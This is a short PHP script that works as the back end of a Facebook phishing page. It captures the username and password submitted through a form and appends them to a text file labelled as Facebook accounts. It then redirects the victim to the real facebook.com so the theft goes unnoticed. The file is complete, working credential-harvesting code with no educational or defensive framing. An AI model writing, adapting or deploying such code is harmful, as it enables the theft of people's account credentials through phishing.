<?php

file_put_contents("cuentasXD.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
